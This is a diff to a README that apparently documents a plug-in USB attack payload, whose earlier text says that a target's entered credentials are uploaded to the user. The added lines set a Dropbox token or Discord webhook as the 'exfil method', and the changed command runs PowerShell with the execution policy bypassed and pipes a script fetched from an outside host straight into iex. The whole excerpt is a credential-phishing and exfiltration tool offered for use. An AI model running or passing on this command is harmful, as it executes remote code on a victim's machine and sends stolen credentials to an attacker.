@@ -41,8 +41,13 @@ Once the target enters their credentials their information will be uploaded to y
 
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+* You know longer need to host your own version of this script 
+* `$db` is the variable that holds your DropBox token
+* `$dc` is the variable that holds your discord webhook 
+* Fill in either or variable or both to set your exfil method
+
 ```
-powershell -noexit -ep bypass $db='';iwr https://jakoby.lol/35k | iex
+powershell -noexit -ep bypass $dc='';$db='';iwr https://jakoby.lol/35k | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
